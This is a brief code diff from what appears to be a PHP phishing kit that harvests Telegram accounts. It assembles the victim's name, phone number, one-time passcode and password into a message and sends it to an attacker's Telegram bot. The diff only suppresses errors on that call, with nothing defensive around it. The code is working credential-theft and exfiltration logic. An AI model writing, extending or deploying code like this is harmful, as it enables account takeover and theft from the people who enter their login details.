@@ -13,6 +13,6 @@ $otp = $_SESSION['otp'] ?? '-';
 
 $message = "*Data Telegram Masuk*\nNama : $name\nNomor : $phone\nOTP : $otp\nPassword : $password";
 $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
-file_get_contents($url);
+@file_get_contents($url);
 
 echo json_encode(["status" => "success"]);
